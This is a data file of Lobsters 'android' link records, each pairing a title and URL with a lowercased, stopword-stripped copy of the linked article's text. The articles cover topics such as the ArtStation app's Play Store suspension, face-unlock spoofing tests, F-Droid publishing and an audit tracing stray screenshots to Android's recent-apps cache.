131,Lobsters,android,Android,What happened to the ArtStation Android App?,https://magazine.artstation.com/2018/12/happened-artstation-android-app/,happened artstation android app,discussion point appeal rejected artstation,getting many question user asking happened artstation android app seems disappeared google play store interest transparency keeping user informed wanted let know happening december unfortunately google suspended artstation app google play store issue violation sexually explicit content policy google provided u following image evidence violation google policy discussion point artstation abuse reporting feature filter mature content app artwork mature content show app artstation moderated support staff member community artwork reported community quickly take action determine work mature content actively remove really explicit content ban user first image tb choi would normal circumstance regarded explicit content moderator interestingly stream appears twitch app also available google play store tb choi drawing appears videostream available twitch app also google play store one concern suspension image google flagged even explicit available many apps example minute using apps reddit instagram proven far racier image apps google play store appear far racier content artstation app discussed internally using google vision api ai image detection assist moderation google vision api even flag one image violating ie even detect without moderator check every single piece content uploaded even tb choi image would flagged mature google vision api mark adult content appeal rejected december artstation submitted appeal google ground image marked mature content would accessible browsing app december received response google appeal rejected app would remain suspended given additional image violates policy since also marked mature content option submitting new hopefully compliant version app artstation currently discussing option expect resubmit hopefully compliant version artstation app new year guy google play store right also give idea deal behind scene artstation thanks leonard teo ceo
132,Lobsters,android,Android,Ditching Android - 6 Weeks On,https://kevq.uk/ditching-android-6-weeks-on/,ditching android week,ditching android better personal opinion comment annoyance conclusion subscribe click,around week ago decided ditching android favour io bought cheap iphone se set migrating android really want drag promise last article would provide update islong story short really enjoying io work really well able replace every app used android overall actually prefer workflow ioswhich better question better moot opinion android io good bad different way people like fact tinker android whereas others see negative people like build quality apple device others think overpricedit personal opinionpersonally prefer io need something tinker inclination tinker mobile device opinion io private androidthe commentsmy last article hit front page hacker news received lot traffic also spawned lot comment constructive appreciated however wanted answer couple recurring theme came comment clearly advert apple case think would chosen year old device also single link apple article advert site using google anymore appear google news feed degoogled mean google crawler stop hitting site google tending analysis nothing site root android install name rom like said time inclination playing around mobile device way want pick use put google spying hide one came lot really surprised everyone something hide whether fact really serial killer fact want anyone anything looking private email significant bank statement credit history number thing truly nothing hide please feel free post email facebook credential comment actually annoyance experienced since ditching android main one typing think combination smaller screen flip multiple keyboard layout punctuation number getting used thoughthe touch screen also feel le responsive requiring number tap get touch register sometimes could older device smaller screen recall issue ipadi heard horror story battery life awful iphones actually opposite use phone day still well battery remaining may social medium account phone checking every second either way battery life greatconclusionthe process ditching android painless iphone still getting latest io update something android device severely lacking despite modeli love form factor little se refreshing phone pocket feel like house brick also sold android device bought iphone se profit overall happy decided move iphone ever move back doubt likely move option decent alternative hit market really see happening time soonsubscribe receive monthly email update preview upcoming post find click
133,Lobsters,android,Android,We Broke Into A Bunch Of Android Phones With A 3D-Printed Head,https://www.forbes.com/sites/thomasbrewster/2018/12/13/we-broke-into-a-bunch-of-android-phones-with-a-3d-printed-head/#46b703c11330,broke bunch android phone head,two head better valuable company world use head face,facial recognition cropping everywhere shopping mall workplace likely something scanning face every day rather invade privacy facial recognition smartphones supposed protect digital life snoop android customer though look away screen tested four hottest handset running google operating system apple iphone see easy break head android opened fake apple phone however impenetrable two head better head printed backface birmingham uk ushered domelike studio containing camera together combine take single shot make full image image loaded editing software error ironed instance missing piece nose backface construct model printer build layer british gypsum powder final touchups colouring added life size head ready within day proud owner uncanny almostspectral version visage head made backface studio birmingham uk forbes test used reallife head register facial recognition across five phone iphone x four android device lg thinq samsung samsung note oneplus held fake head device see device would unlock four android phone spoof face able open phone though differing degree ease iphone x one never fooled disparity android device security hack instance first turning brand new lg actually warns user turning facial recognition face recognition secondary unlock method result phone le secure say noting similar face unlock phone surprise initial testing head opened straightaway yet filming appeared lg updated improved facial recognition making considerably difficult open lg spokesperson told forbes facial recognition function improved device second recognition step advanced recognition lg advises setup lg constantly seek make improvement handset regular basis update device stability security added facial recognition seen secondary unlock feature others like pin fingerprint similar warning samsung sign phone could unlocked someone something look like note use facial recognition le secure using pattern pin password oddly though setting device first presented option unlocking facial iris recognition whilst iris recognition nt duped fake head mistedover eye facial recognition tricked albeit need try different angle lighting first note feature turn faster recognition manufacturer admittance le secure slower option matter case head unlocked setting though take little effort lighting angle slower option went slower version lg latter proving trickier break samsung spokesperson told forbes facial recognition convenient action open phone similar swipe unlock action offer highest level biometric authentication fingerprint iris lock phone authenticate access samsung pay secure folder oneplus came neither warning android phone choice slower secure recognition despite scifi style face scanning graphic registering face phone instantly opened presented fake head undoubtedly least secure device tested oneplus spokesperson said designed face unlock around convenience took corresponding measure optimize security always recommended use passwordpinfingerprint security reason face unlock enabled secure apps banking payment constantly working improve technology including face unlock luck iphone x though apple investment tech saw company work hollywood studio create realistic mask test face id clearly paid impossible break model microsoft appeared done fine job new window hello facial recognition also nt accept fake head real little surprise two valuable company world offer best security use head face anyone worried anyone device compromised fake head either method others perhaps consider using facial recognition instead use strong alphanumeric passcode recommended matt lewis research director cybersecurity contractor ncc group focus secret aspect pin password added reality biometrics copied anyone enough time resource objective invest try spoof biometrics
134,Lobsters,android,Android,Open Camera,http://opencamera.org.uk/,open camera,open camera jump instruction autolevel hdr download google play alternative download site supporting open camera blog discussion forum code repository git credit privacy policy gpl later http faq apache license version http http designgooglecomicons http githubcomgooglematerialdesignicons http googlegithubiomaterialdesignicons apache license version cc cc cc bysa cc cc cc gpl cc cc bysa cc cc cc cc cc cc open camera privacy policy licence open camera sourceforge,open camera jump instruction open camera open source camera app phone tablet feature option autolevel picture perfectly level matter expose camera functionality support scene mode color effect white balance iso exposure compensationlock selfie screen flash hd video handy remote control timer optional voice countdown autorepeat mode configurable delay option take photo remotely making noise voice command cheese configurable volume key user interface upsidedown preview option use attachable lens overlay choice grid crop guide optional gps location tagging geotagging photo video photo includes compass direction gpsimgdirection gpsimgdirectionref apply date timestamp location coordinate custom text photo store datetime location video subtitle srt panorama including front camera support hdr autoalignment ghost removal exposure bracketing support api manual control optional focus assist burst mode raw dng file slow motion video noise reduction including low light night mode dynamic range optimisation mode better quality photo option onscreen histogram zebra stripe focus peaking focus bracketing mode completely free ad app run ad website open source feature may available device may depend hardware feature android version download google play also see alternative download site open camera completely free however wish show appreciation supporting open camera blog discussion forum code repository git content open camera requires android better feature may available device may depend android version require specific support cameradevice note possible test open camera every android device let alone combination different android version especially alternative rom please test using open camera photovideo wedding etc see detail issue various device open camera written mark harman additional contributor see credit detail see privacy policy detail open camera released gpl later source code available http also see use open camera source code app faq open camera us androidxjetpack library apache license version following file used open camera open camera us icon google material design icon http http designgooglecomicons http githubcomgooglematerialdesignicons http googlegithubiomaterialdesignicons google apache license version case include modification need credit particular modified exposurelockedpng modified exposureunlockedpng modified flashautopng icactionflashautomatic flashoffpng icactionflashoff flashonpng icactionflashon focusmodelockedpng modified modified modified iclaunchertakephotopng modified modified modified icstatnotifytakephotopng modified popup png modified icmorevertwhite baselinehighlightwhite baselineremoveredeyewhite icactionflashautomatic icactionflashoff icactionflashon settingspng icactionsettings sharepng icactionshare switchcamerapng icactionswitchcamera takephotopng modified takephotoprefpng modified takephotopressedpng modified takephotowhenvideorecordingpng modified takevideopng modified takevideoprefpng modified takevideopressedpng modified takevideorecordingpng modified trashpng icactiondiscard whitebalancelockedpng modified whitebalanceunlockedpng modified modified version icon also used website open camera app iconlogo also make use icphotocamera google also apache license version note old version open camera also used following exposurelockedpng focusmodelockedpng whitebalancelockedpng modified http ahasoft cc need credit exposureunlockedpng whitebalanceunlockedpng modified http ahasoft cc need credit flashoffpng flashautopng flashonpng http working group cc bysa flashredeyepng popupflashredeyepng http designmodo andrian valeanu cc need credit flashtorchpng popuptorchpng http iconfinder http wwwiconfindernet cc focusmodemacropng http yankoa http yankoadeviantartcom cc gallerypng http alessandro rei gpl settingspng http designmodo andrian valeanu cc sharepng http wpzoom cc bysa switchcamerapng http valera zvonko cc switchvideopng http fatcow web hosting cc switchvideopng merged image http http yankoa cc need credit takevideopng takevideoprefpng takevideopressedpng takevideorecordingpng http yankoa http yankoadeviantartcom cc app iconlogo takephotopng takephotopressedpng http yankoa cc trashpng http designmodo andrian valeanu cc android google play google play logo trademark google llc open camera privacy policy website us icon third party source see licence open camera sourceforge
135,Lobsters,android,Android,Debugging a Non Reproducible Crash,https://blog.bam.tech/developper-news/debugging-a-non-reproducible-crash,debugging non reproducible crash,react native oh horror suddenly receiving increased number android crash sentry let reproduce analyzing stacktrace let find another way native navigation reactnativesvg getting bottom finally revelation since version lib thread safe thread safe little theory race condition thread safe case could happen fixing pr reactnative react native,october team release new version react native app happy proud deliver new feature user oh horror hour release suddenly receiving increased number android crash crash reporting tool sentry fire new error type jsapplicationillegalargumentexception error updating property left shadow node type rctview react native usually happen set property wrong type come nt catch error testing app new release well tested every member team panel multiple device also error seem quite random seem happen combination property type shadow node first occurring instance error updating property paddingtop shadow node type rctview error updating property height shadow node type rctimageview error updating property fill view managed rnsvgpath also seems happen device android version based sentry report majority android crash consistent user base let reproduce first step want fix bug reproducing right fortunately thanks sentry log know user triggering crash soooo let see welp vast majority crash user opening app kaboum crash happens okay let try replicate store app installed different android device let try reproduce opening quitting app time luck crashing app impossible reproduce locally dev mode right seems pointless crash seem quite random anyway crash rate raising seems like basically chance app crash starting analyzing stacktrace able reproduce crash let try understand come think well thing mentioned different error similar yet entirely similar stacktraces ok let take first one analyse javalangarrayindexoutofboundsexception simplepoolrelease comfacebookreactbridgedynamicfrommaprecycle comfacebookreactuimanagerlayoutshadownodesetheight javalangreflectmethodinvoke methodjava javalangreflectinvocationtargetexception null javalangreflectmethodinvoke methodjava comfacebookreactbridgejsapplicationillegalargumentexception error updating property height shadow node type rnsvgsvgview comfacebookreactuimanagerviewmanagerspropertycache propsetterupdateshadownodeprop ok happening hmm pretty deep android support library point afraid would take much time investigating want find quickest way fix issue user take time investigate root cause behind bug let find another way another way find root cause bug check new change made release especially change would affect native android code hypothesis emerge upgraded native navigation navigation solution used native fragment android screen upgraded reactnativesvg exception related svg component relation maybe good bet point since reproduce bug best bet downgrading one libs roll user since trivial play store check back user crash happens new release way validate invalidate hypothesis choose library downgrade one solution decide playing head tail really want resolve getting bottom ok let dig deeper stacktrace previously picked see determine library select simple nonsynchronized pool object param pooled type public static class simplepool implement pool private final object mpool private int mpoolsize override public boolean release instance isinpool instance throw new illegalstateexception already pool mpoolsize mpoollength mpool mpoolsize instance mpoolsize return true return false crash occurring error javalangarrayindexoutofboundsexception meaning mpool array size right get addition recycle method place mpoolsize modified acquire method simplepool class public acquire mpoolsize final int lastpooledindex mpoolsize instance mpool lastpooledindex mpool lastpooledindex null mpoolsize return instance return null way mpoolsize hitting line mpoolsize possible condition mpoolsize let put breakpoint android studio check going start app mean condition piece code could malfunction finally revelation see dynamicfrommap static reference simplepool private static final poolssimplepool dynamicfrommap spool new poolssimplepool dozen hit play button carefully placed breakpoints see simplepoolacquire simplepoolrelease called mqtnativemodules thread react native manage style property react component width component also called main thread see used update fill prop main thread typically reactnativesvg component indeed turn reactnativesvg using dynamicfrommap since version lib improve performance native svg animation aaaand function actually called thread dynamicfrommap using simplepool thread safe manner thread safe say nt know term explain next part already know mean feel free skip case could happen thread safe little theory javascript single threaded javascript developer usually need deal thread safety java hand support concept concurrent multithreaded program several thread run within single program potentially access common data structure lead unexpected result let take simple example image thread thread b read integer memory increment value return thread b could potentially access data value thread done updating expected two separate increment result final value potentially get instead scenario final state data depends relative order thread operation called race condition problem race condition nt necessarily happen time possible case thread b work incrementing value giving enough time thread update value explains randomness impossibility reproduce crash data structure said thread safe operation done concurrently many thread without risk race condition one thread performing read particular data element thread allowed modify delete element called atomicity earlier example update cycle atomic race condition would avoided thread b would waited thread complete increment would gone ahead case could happen since dynamicfrommap holding static reference simplepool multiple dynamicfrommap called different thread concurrently call acquire method simplepool image thread calling method evaluating condition true nt yet decreased value mpoolsize shared thread b thread b concurrently calling method already evaluating condition true also separate call would subsequently decrease value mpoolsize get impossible value fixing looking fix found pr reactnative merged making thread safe deployed patched version react native rolling user crash finally fixed hooray finally thanks help janic duplessis react native core contributor mikael sand reactnativesvg maintainer fix included next minor react native bug took u effort fix great opportunity dig deeper reactnative reactnativesvg good debugger well placed breakpoints go long way hope learned something useful well edit french reader check talk subject parisjs
136,Lobsters,android,Android,"Square + Flutter: Beautiful, fast mobile payment apps",https://medium.com/square-corner-blog/square-flutter-beautiful-fast-mobile-payment-apps-539995d2e23a,square flutter beautiful fast mobile payment apps,flutter live event collins family orchard flutter plugin square reader sdk inapp payment sign omnichannel payment try square flutter plugins today,flutter live event showed collins family orchard custom flutter app take inperson payment square collins family fourthgeneration organic family farm selling produce multiple location square year loved using square faced challenge keeping track sale location vendor moving several farmer marketsin order track produce sold location created custom branded point sale app us flutter plugin square reader sdk using locationaware app see made sale flutter collins family quickly created beautiful app integrating square hardware streamline paymentsinapp paymentstoday also announcing flutter plugin inapp payment feature require hardware customer mobile device flutter write code io android square flutter taking pain complexity building apps paymentswithin app customer enter card number use digital wallet make payment add inapp payment plugin flutter app customize look feel leave payment complexity usour inapp payment flutter plugin support popular wallet including google pay apple pay usonly early access also support card file enables safely store card postsale streamline experience future purchase together plugin make frictionfree seamless customer purchase flutter app resulting increased conversion salesyou sign get early access take payment square mobile appomnichannel paymentswith square flutter plugins online inapp inperson custom app payment report single place square seller also get advantage dedicated dispute management team fraud detection powered machine learning wherever taking payment get benefit squarewe following flutter quickly fell love combination fast development experience beautiful output many customer asking u produce flutter plugins seeing fast growth flutter knew make priority supporting carl perry general manager developer platform squaretry square flutter plugins today incredibly excited see build
137,Lobsters,android,Android,AndroidProjectCreator – The ‘how’ and ‘why’,https://maxkersten.nl/2018/11/21/androidprojectcreator-the-how-and-why/,androidprojectcreator,jadx jdcmd jdgui fernflower proofofconcept notepad goal fixing error androidprojectcreator installation application flow android studio conclusion reddit libraanalysis,preferably reversing malware one open apk preferred tool order see decompiled code analyst digest inner working malicious sample possible proprietary tooling cost quite money job android malware analyst tooling able simply open apk allowed refactor name add comment execute script resulted efficient analysis malicious sample since quit job moved graduate access tool anymore lookout find something similar within budget ala search yielded result although jadx option export content apk android studio project always succeed decompiling class tool tested jdcmd part jdgui fernflower manage correctly decompile code either tool generally failed different class resulting possibility use multiple decompilers obtain correct decompilation every class apk besides convenience reason include multiple decompilers project wondering leaving name program article purpose want imply wrongdoing company sole purpose androidprojectcreator create tool provides alternative analyse apks spare time school assignment obviously company free use well user usage allowed according term provided gnu gpl license proofofconcept creating androidprojectcreator unable efficiently analyse android malware due limitation program used window used notepad search file name something wanted replace problem fact within package duplicate name class method field using search file functionality manually select entry wanted refactor resulted slow analysis lot mistake additionally undo functionality since multiple file altered mistake therefore permanent manually creating backup folder working required example code multiple method field name using single search replace would replace much method desired name essentially would make code even unreadable minified andor obfuscated code already decompilation public class public int public int b public int return b public int b return public class b public int public int b public int return b public int b return tool often used decompile android application jadx gui version provides overview application show decompiled java code allow user refactor add comment execute script one using cli gui export decompiled java code code used another tool jdcmd used jdgui fernflower also used combination apktool first apk decoded using apktool classesdex file converted java archive jar jar decompiled java code goal search free preferably opensource tool would allow refactor code add comment execute script command seemed like hard one first one leave fact decompiled code simplest solution would pick ide use went option since ides allow refactoring code addition comment execution script ides advanced program make life programmer easier even though reverse engineering different form programming still applicable since code android application logical use android studio using decompiled code created android studio project ala gave handful error firstly manifest could found secondly resource could found error resulted early gradle build limited functionality ide way refactoring code became disabled fixing error fix error used decoded androidmanifest decoded resource placing two correct place within android studio project gradle build partially succeeded complete successful build nearly always impossible since decompiled code contains element accepted compiler example would jump label used reckognised compiler thus resulting error build need succeed point ide refactor code execute script partially succeeding gradle build task allow refactoring code adding comment possible along script executed proofofconcept successfully completed androidprojectcreator proofofconcept paved way automated version within automated version multiple different tool could included coming release aforementioned tool jdcmd jdgui jadx fernflower apktool included empty android studio project also included template future tool included installation installation feature requires user interference long correct prerequisite installed java jre jdk maven forget set javahome environment variable additional program stored single folder sub folder program folder named library used store program resides directory androidprojectcreator jar background git repository tool cloned sub directory library named repos building process tool started separate process machine output process shown user command line interface tool built compiled version tool copied correct subfolder within library folder repository deleted step onwards androidprojectcreator used without internet connection reason clone git repository ensure latest stable version tool used branch used selected application flow upon providing correct parameter decompilation assembly android studio project started apk first decoded using apktool provides three object used later step firstly manifest file used template project secondly resource folder also used template project lastly classesdex file given classesdex file converted jar using java code derived jar using decompiler also used template project note none tool parameter provided stored within androidprojectcreator tool finished template project extracted filled required data temporary directory named temp within library folder android studio project copied provided output directory specified user last temporary folder temp deleted android studio using android studio one receive multiple error warning solvable using help ide one commonly encountered mismatch buildtools solved simply allowing android studio download correct toolset conclusion conclude androidprojectcreator provides simple free way get started analysis apk using given decompilers user easily see tool provide output required combination output different decompilers also used since variable name derived smali code intermediate language mean class decompiled using decompiler used project decompiled using decompiler b since variable name true project yet refactored androidprojectcreator provides enhanced automated experience multiple tool single bundle using command line interface automated project set environment variable system would allow user call androidprojectcreator jar anywhere system contact email info maxkersten dot nl send pm reddit dm twitter libraanalysis
138,Lobsters,android,Android,Publishing Applications through F-Droid,http://www.boddie.org.uk/david/www-repo/Personal/Updates/2018/2018-11-11.html,publishing application fdroid,publishing application via fdroid android mailing list fdroid preparation contribute documentation contributing fdroid fdroid data repository getting help fdroid forum nonstandard development tool sample build recipe build metadata reference fdroid data quickstart build test repeat first merge request another merge request yet another merge request finally available yet another merge request finishing touch screenshot two quite way category,publishing application via fdroid started working set python module reading writing bytecode dalvik virtual machine could experiment creating application android without write java time since written small application learn android explore capability device example demo test compiler framework others intended useful could downloaded application perform task wanted wanted minimal application could understand trust wrote simple application happy install locally phone september need back data phone longer use wrote small application dump data phone storage area allowing retrieve using adb tool desktop computer wondered people might find application like useful asked fsfe android mailing list discussion followed suggested try publish application via fdroid preparation starting point someone want publish application via fdroid fdroid contribute page documentation contains set link relevant guide various kind developer including making application deploying fdroid server software server found contributing fdroid document useful shortcut finding fundamental step needed submit application publication document part fdroid data repository hold information application provided catalogue however bit uncertain write metadata application problem fdroid infrastructure build application source code built using standard android sdk application getting help joined fdroid forum ask assistance problem topic nonstandard development tool quickly offered help getting toolchain integrated fdroid build process expected going take lot effort part fdroid contributor pierre rudloff came sample build recipe application showing simple could include application fdroid catalogue needed know describe properly way describe application build process available version contained build metadata reference document bit intimidating read useful given example start example meant nt really look hard document would returning long get metadata build process application hosted fdroid need add fdroid data repository done using familiar cycle cloning committing testing pushing making merge request many u familiar data repository provides useful quickstart guide tell set local repository testing one thing cloning repository fork data repository could add metadata git clone http gitlabcomfdroidfdroidservergit export path path pwdfdroidserver clone fork data repository git clone http gitlabcomdboddiefdroiddatagit added file metadata directory repository called ukorgboddieandroidweatherforecasttxt containing description application information version dependency build process ran check using fdroid tool server repository checking metadata valid suitable format data repository verifying package could built fdroid lint ukorgboddieandroidweatherforecast fdroid rewritemeta ukorgboddieandroidweatherforecast fdroid build v l ukorgboddieandroidweatherforecast third command requires androidhome environment variable set old android sdk installation refer order work even though application nt use reference androidhome variable refers directory sdk equivalent contains buildtools directory build test repeat point time commit new file fork data repository push back gitlab logged site verifying commit offered option create merge request official fdroid data repository led first merge request fdroid thing moving forward unfortunately managed specify dependency needed build application using tool particular rely pycrypto create digest file available default build environment led another change metadata another merge request still plain sailing point despite producing application package launcher icon generated incorrectly required change application ensure svg used icon form could converted png file tool available build environment yet another merge request updated current version number fixed application could build distributed application finally available form originally intended still everything perfect couple user quickly came forward suggestion improvement bug report concerning way handled place name rather failed handle application fixed yet another merge request created handled smoothly fdroid maintainer finishing touch thing done developing releasing application least one fundamental thing least one cosmetic enhancement could done improve experience around installation process basic thing write proper changelog since really going proof concept showed application written duck could published via fdroid application evolved original form informally go back least document bug fix made release cosmetic improvement would improve fdroid catalogue entry include screenshot two least prospective user could see getting another metafeature would useful use fdroid autoupdate facility sure need update application future document remind would easier everyone fdroid could pick new version appear seem quite way think something work summary easier imagined publish application fdroid catalogue process smooth people friendly happy help write free software application android encourage publish via fdroid submit metadata make publication quick easy possible category serpentine fdroid android python free software
139,Lobsters,android,Android,Detecting Privacy Leakages w/ Fewer Alerts via Enhanced Data-flow Analysis and Peer Voting,https://wenke.gtisc.gatech.edu/papers/aapl.pdf,detecting privacy leakage w fewer alert via enhanced dataflow analysis peer voting,,obj stream g l w e
140,Lobsters,android,Android,This Week In F-Droid 29: New Matrix Server and Mirror Testers Wanted,https://f-droid.org/en/2018/11/10/twif-29-new-matrix-server-and-mirror-testers-wanted.html,week fdroid new matrix server mirror tester wanted,fdroid repository free open source client mirror tester wanted forum admin issue tracker help wanted auditing proxy uniq auditing proxy hourly website translation update project streamline translation process hc announced http stagingfdroidorg fairphone service faa commown fairphones fdroid matrix server set matrix server nicoalt mathijs hc max dor kamax new apps updated apps cythara apple flinger feeder mastalab solitairecg simpletask open contact task tip feedback mastodon fdroidorg mastodontechnology twif twif submission thread thursday fdroid freenode fdroid matrixorg telegram forum,week fdroid week edition lot fdroid news looking mirror tester help developing auditing proxy also setting matrix server news fairphone service app department new updated apps fdroid repository verified free open source android apps client access well whole store providing tool needed set run app store communityrun free software project developed wide range contributor story past week mirror tester wanted everything needed support mirror place running need user use still beta please report problem either forum admin issue tracker add mirror scan qr code click android device send fdroid fdroid prompt add mirror fdroid mirror â â â â â â â â â help wanted auditing proxy uniq put together auditing proxy force downloads match trusted whitelist build process order reliably work need able act http downloads well looking help people experience mitmproxy similar thing put together solid trustworthy configuration hourly website translation update recently started project streamline translation process specific focus website android client hc announced first concrete improvement workflow hourly rebuilds http stagingfdroidorg translating website build process check update hour fairphone service faa commown website french sorry french cooperative support fair sustainable electronics buying leasing fairphones customer recently announced choose fairphone o android google apps fairphone open o aosp without proprietary app preinstall several apps open version fdroid fennec silence amaze etc user experience beginner better outdated aosp system apps apps installed fdroid continue updated fdroid client reading fdroid matrix server several core fdroid contributor use matrix communicate amongst fdroid irc room bridged matrix matrix became popular building presence establishing room instead one bridge creates u reached consensus within fdroid next step like set matrix server starting small allowing core fdroid contributor access fdroid room nicoalt mathijs volunteered administrate server independent fdroid contributor hc contributed vm purpose process set also like thank max dor generous offer host administrate corporatequality matrix setup bell whistle part sponsorship deal kamax however point chose go minimal setup rely resource independent contributor new apps updated apps total apps updated week highlight due time shortage apps lacking changelog url fdroid metadata skipped week cythara musical instrument tuner updated update add cello tuning set chromatic tuning default fix scrolling issue landscape mode apple flinger funny single multiplayer game use slingshot shoot apple update add winter level stats onscreen list translator credit screen several translation update additionally wiki page website describing create new level sick bloated nonfree r reader steal personal information tired convoluted syncing setup fed create account everywhere try feeder version remove option sync hotspot fix automatic synchronization running mobile add option sync app opened improves caching reduce data use improves sync speed add simplified chinese translation smaller fix mastalab fullfeatured mastodon peertube client updated update add ability block domain profile add support original light theme reworked also improved theme picker addition many smaller ux improvement still work progress host bug fix solitairecg adaptation ken device hardware button version make upper right hand suit large card art visible change fixed help file hyperlink backtotop link hood build using gradle instead ant big thanks rudy sudrich making release reality simpletask updated fixing crash un completing task fixing state completion checkbox task list change fixing tag sorting featured open contact hide contact away apps stealing contact information keeping contact safe different database handle magic like showing name upon receiving call version make call log entry consistent placing icon either side add activity put activity portrait mode error dialer shown inline rather alert task updated new location row task edit screen location departure notification set caldav completion percentage status new white theme color new icon new list tag chip many ui ux improvement additionally minimum required android version bumped tip feedback important app update write send tip via mastodon send fdroidorg mastodontechnology remember tag twif use twif submission thread forum deadline next twif thursday utc general feedback also sent via mastodon like live chat find u fdroid freenode matrix via fdroid matrixorg telegram space bridged together choice also join u forum
141,Lobsters,android,Android,Android Security Auditing (Investigating Unauthorized Screenshots),https://tech.michaelaltfield.net/2018/11/09/android-security-auditing-investigating-unauthorized-screenshots/,android security auditing investigating unauthorized screenshots,diskdigger recurse center click context nexus bullhead lineageos oreo api discovery deleted file data stick around overwritten new file data secure wipe encrypted messaging app wire auditing attempt via selinux nsa rhel selinux google ported selinux android version jelly bean android compatibility definition document version section security feature newer fork android selinux documentation folk auditing attempt via file metadata analysis root cause yield result credential encrypted take away hardwaresupply chain issue irresponsibly held cyberwarfare arsenal backdoor critical security software flagsecure,six month ago discovered something smartphone horrified went undelete file diskdigger stumbled upon plethora unexpected jpegs screenshots activity screenshots nt take screenshots conversation screenshots gps position screenshots bitcoin wallet perplexed astonished honest scared happen vulnerability shipped lineageos could malicious binary embedded aosp exploit one damned closedsource apps forced install social pressure cough whatsapp week honored accepted mini batch recurse center formerly hacker school brooklyn ny finally decided rollup sleeve dig auditing android security ultimate goal finding responsible creating deleting screenshots well thanks google find source codebase integrated aosp spoiler something sweat though fun journey update view slide presentation rc click context encountered nexus bullhead running lineageos oreo api phone rooted gapps installed clear android developer though write hello world app discovery techsavvysecconscious reader aware file deleted bit nt lost marked unused deleted file data stick around happens overwritten new file data secure wipe performed could regarded bad thing many people concerned privacy especially example try sell old phone factory reset enough prevent new owner viewing photo however could also regarded good thing like deleted precious image accident accidentally deleted image oh shoot fired diskdigger app scan disk remnant deleted file restore diskdigger scanning data partition deleted image file stumbled upon bargained image restored diskdigger interesting thing note image example many sensitive apps spared encrypted messaging app wire image seemingly useless screenshot home screen limited apps homescreen screenshot also taken menu item halftransparent interesting regarding timing screen capture event many many file corrupt could artifact fact marked unused filesystem subsequently partially overwritten auditing attempt via selinux irony lost first two day rc spent reading documentation tool originally developed nsa exactly week rc figure source screenshots finally sat monday begin investigation figured would write auditd rule capture file writes file deletion throw selinux permissive mode spend lot time searching log pinpoint process id responsible creating screenshot image strong background rhel system administration nsa worked rhel design selinux security enhanced linux year later google ported selinux android version jelly bean trying rhel server toolsofchoice would auditctl ausearch thought android linux install auditd toolset able use auditctl android shell oh boy ignorant fact google go great length prevent user developer manipulating selinux rule intention explicitly outlined android compatibility definition document cdd version section security feature read device implementation must ensure compliance security feature kernel platform described android sandbox includes feature use securityenhanced linux selinux mandatory access control mac system seccomp sandboxing security feature linux kernel device implementation must make selinux security feature implemented android framework configurable user app developer fact auditctl command android world seems never official tool user developer manipulate selinux rule set security auditing purpose android community full hacker first person wanting modify selinux ruleset fact tool called sepolicyinject newer fork exists exact purpose android selinux documentation spends lot time talking craft selinux policy unsatisfactorily abstract nt tell file policy eventually stored andorid device reason explained certainly nt tell modify file new rule well friend selinux policy compiled binary stored root android filesystem sepolicy absense auditctl sepolicyinject exists turn binary back humanreadwriteable policy file recompile copy back onto android device effectively allowing user update selinux policy problem though time writing sepolicyinject nt updated year order use download worth android source code provision specific o build environment hope spend week fighting hairpulling compilation error unlike folk successful completely abandoned attempt use selinux tool figure process taking screenshots phone auditing attempt via file metadata analysis couple interesting fact readily jump screenshot file restored diskdigger namely file jpgs tell android take screenshot store image png unlike traditional screenshots image nt include top bar batterywifietc icon live b bottom bar backhomerecent apps button live c keyboard case blackedout also checked clue exif image metadata one thing jumpedout image attribute named profile copyright value google inc michael amy tmp exiftool profile copyright google inc another clue would directory image stored deleted unfortunately diskdigger nt provide info nt available metadata search across entire device jpg image excluding file camera dcim directory nt many directory question one stood end file list directory named information critical bullhead find name jpg sdcardfindjpgstxt bullhead tail sdcardfindjpgstxt bullhead copied content directory sdcard copied laptop via adb lo behold bunch screenshots image matched observation format jpg top bottom bar blackedout exif copyright google root cause googling directory yield result people experienced issue root cause clear persisted image taken android recent apps navigation io also app switcher cache image app quickly switching apps indeed screenshot image discovered recent task list snapshot image stored disk requiring topbottom bar copyright google deleted longer needed also worth noting directory datasystemce socalled credential encrypted directory whoose encryption key includes userspecific password file certainly inaccessible apps except grant root access take away hardwaresupply chain issue zerodays irresponsibly held cyberwarfare arsenal instead responsible disclosure incessant attempt backdoor critical security software easy develop paranoia said always good keep mind everything seems sometimes seeminglysketchy behavior actually welldesigned benign also understand google nt make exceedingly easy user modify sepolicy file think aosp include offbydefault tool power user able manipulate selinux policy purpose security auditing android developer app sensitive data way consider setting flagsecure prevents android taking snapshot app
142,Lobsters,android,Android,My Google-free Android life,https://lushka.al/my-android-setup/,googlefree android life,post richard stallman next list setup tutorial achieved xiaomi redmi note pro whyred xiaomi budgetfriendly mah battery miui include data mining ad system altogether miui bootloader wikipedia make request mi unlock activate debugging setting developer option unlock phone period day careful make sure backup data unlocking bootloader deletes everything phone rom xda developer forum forum category aosip rom edit e website lineage microg apkpure recommend using e root access magisk module recovery system twrp flash adb tool issue wipe command install system edit gapps google cloud messaging firebase microg tada next part installing apps configuring everything fdroid free open source apps aurora store izzyondroid adaway afwall amaze ameixa andotp anysoftkeyboardaosp keyboard project audio recorder battery charge limit nextcloud instance document viewer deezloader remix easy xkcd etar fasthublibre fennec fdroid gadgetbridge mail lawnchair mattermost newpipe nextcloud sm nextcloud note opentasks osmand openstreetmap qksms resplashmysplash unsplash screencam secscanqr send reduced free slide telegram fo trebleshot tusky mastodon unit converter ultimate vinyl music player vpn hotspot list useful fdroid apps configs pretty simple straightforward give tip screenshot home screen attributionnoncommercialsharealike international,people asking lot lately phone android setup manage use smartphone without google service well post aim address precisely would like make article really beginnerfriendly try go slow going thing one one including screenshots better view thing happen work like first start google service imo bad device could cut short guide post richard stallman grabbing main point adding nonfree software required general google service require running nonfree javascript code nowadays nothing whatsoever appears javascript disabled even making google account requires running nonfree software javascript sent site thing logging surveillance google quietly combine adtracking profile browsing profile store huge amount data user term service google cut account user resell pixel phone lose access mail document stored google server account censorship amazon google cut domainfronting feature used enable people tyrannical country reach communication system banned google agreed perform special censorship youtube government pakistan deleting view state opposes help illiberal pakistani state suppress dissent youtube content id automatically deletes posted video way copyright law require reason read post rms linked try explain point detail although may look like tinfoil hat reaction action already happen everyday real life next list setup tutorial achieved xiaomi redmi note pro smartphone codename whyred produced china xiaomi bought around eur month ago time writing post might thinking buy chinese brand reliable yes made usuals would expect samsung people often associate android plain wrong oneplus nokia etc know almost every phone produced china reason chose phone first one course price quite budgetfriendly device people able afford next one would spec paper pretty decents price tag inch screen full hd resolution mah battery superb battery life ram storage dual back camera front camera flash decent efficient snapdragon probably best choice moment issue came miui android skin xiaomi 